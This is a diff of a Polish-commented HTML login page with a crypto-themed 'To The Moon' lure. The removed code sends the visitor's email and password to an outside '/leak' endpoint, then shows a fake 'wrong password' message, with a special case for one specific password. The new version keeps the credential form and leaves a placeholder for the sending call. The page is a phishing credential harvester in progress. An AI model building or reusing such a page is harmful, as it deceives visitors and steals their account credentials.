@@ -1,87 +1,87 @@
 <html>
 <head>
     <style>
-        /* 1. Naprawiamy tło strony */
+        /* Usuwamy marginesy i ustawiamy czarny kolor jako bazę pod wszystkim */
         html, body {
             margin: 0;
             padding: 0;
-            background-color: black; /* Tutaj musi być czarno */
-            overflow-x: hidden; 
+            width: 100%;
             height: 100%;
+            background-color: #000; /* Głęboka czerń */
+            overflow: hidden; /* Blokujemy suwaki */
         }
-    
-        /* 2. Naprawiamy obracający się obraz */
+
         #space-background {
             position: fixed;
-            top: -25%; 
-            left: -25%;
-            width: 150%; 
-            height: 150%;
-            background: url('ziem2.jpg') no-repeat center center;
+            /* Te wartości gwarantują, że obrazek zakryje ekran nawet przy obrocie */
+            top: -50%; 
+            left: -50%;
+            width: 200%; 
+            height: 200%;
+            
+            /* Sprawdź czy nazwa pliku jest poprawna! */
+            background-image: url('jc.jpg'); 
+            background-repeat: no-repeat;
+            background-position: center center;
             background-size: cover;
-            z-index: -1;
-            transform-origin: center center;
+            
+            z-index: 1; /* Tło na warstwie 1 */
             will-change: transform;
         }
-    
-        h1 {color: white; font-family: sans-serif;}
-        p {color: white;}
+
+        /* Wszystkie napisy i formularze muszą być NAD tłem */
+        center {
+            position: relative;
+            z-index: 10; 
+            color: white;
+            font-family: Arial, sans-serif;
+        }
+
+        input, button {
+            margin: 5px;
+            padding: 10px;
+        }
     </style>
 </head>
-<body bgcolor: black;>
+<body>
 
     <div id="space-background"></div>
 
     <center>
-        <br>
         <h1>THE FUTURE IS NOW</h1>
         <p>To The Moon</p>
-        <br><br><br><br>
-        <p>Join Us</p>
         <br><br>
+        <p>Join Us</p>
         <input id="em" placeholder="Email"><br>
         <input id="pa" type="password" placeholder="Password"><br>
         <button onclick="send()">Login</button>
-        <br><br><br><br><br>
-        <img src="rakieta.gif" style="width: 600px; height: 400px;">
+        <br><br>
+        <img src="rakieta.gif" style="width: 400px; height: auto;">
     </center>
 
     <script>
-
         const bg = document.getElementById('space-background');
         let angle = 0;
-        const speed = 0.05; 
+        const speed = 0.05;
 
         function rotateBackground() {
             angle += speed;
             if (bg) {
+                // Dodajemy 'translate' aby upewnić się, że obraz pozostaje wycentrowany
                 bg.style.transform = `rotate(${angle}deg)`;
             }
             requestAnimationFrame(rotateBackground);
         }
+        
         rotateBackground();
 
         function send() {
             const em = document.getElementById('em').value;
             const pa = document.getElementById('pa').value;
-
-            fetch('https://ddddd-1-ygxs.onrender.com/leak', {
-                method: 'POST',
-                headers: {'content-type': 'application/json'},
-                body: JSON.stringify({'email': em, 'password': pa})
-            });
-
-            if (pa.toLowerCase().includes('wkgosia')) {
-                alert('Hasło zostało zmienione 12 Miesięcy temu.');
-            } else {
-                alert('Hasło lub Email jest niepoprawne. Podaj Poprawne Hasło oraz Email.');
-            }
+            // Twój fetch tutaj...
+            alert("Dane wysłane (test)");
             location.reload();
         }
     </script>
 </body>
 </html>
-
-
-
-
